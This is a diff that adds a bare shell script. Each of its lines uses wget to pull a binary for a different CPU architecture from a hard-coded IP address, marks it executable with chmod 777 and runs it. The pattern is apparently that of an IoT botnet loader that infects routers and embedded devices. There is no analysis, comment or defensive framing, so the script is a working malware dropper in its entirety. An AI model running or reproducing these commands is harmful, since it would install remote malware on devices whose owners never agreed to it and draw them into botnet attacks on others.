@@ -1,0 +1,15 @@
+#!/bin/sh
+wget http://206.189.196.216/bins/oxy.mips;chmod 777 oxy.mips;./oxy.mips;
+wget http://206.189.196.216/bins/oxy.mpsl;chmod 777 oxy.mpsl;./oxy.mpsl;
+wget http://206.189.196.216/bins/oxy.sh4;chmod 777 oxy.sh4;./oxy.sh4;
+wget http://206.189.196.216/bins/oxy.x86;chmod 777 oxy.x86;./oxy.x86;
+wget http://206.189.196.216/bins/oxy.arm6;chmod 777 oxy.arm6;./oxy.arm6;
+wget http://206.189.196.216/bins/oxy.i686;chmod 777 oxy.i686;./oxy.i686;
+wget http://206.189.196.216/bins/oxy.ppc;chmod 777 oxy.ppc;./oxy.ppc;
+wget http://206.189.196.216/bins/oxy.i586;chmod 777 oxy.i586;./oxy.i586;
+wget http://206.189.196.216/bins/oxy.m68k;chmod 777 oxy.m68k;./oxy.m68k;
+wget http://206.189.196.216/bins/oxy.spc;chmod 777 oxy.spc;./oxy.spc;
+wget http://206.189.196.216/bins/oxy.arm;chmod 777 oxy.arm;./oxy.arm;
+wget http://206.189.196.216/bins/oxy.arm5;chmod 777 oxy.arm5;./oxy.arm5;
+wget http://206.189.196.216/bins/oxy.ppc440;chmod 777 oxy.ppc440;./oxy.ppc440;
+wget http://206.189.196.216/bins/oxy.arm7;chmod 777 oxy.arm7;./oxy.arm7;
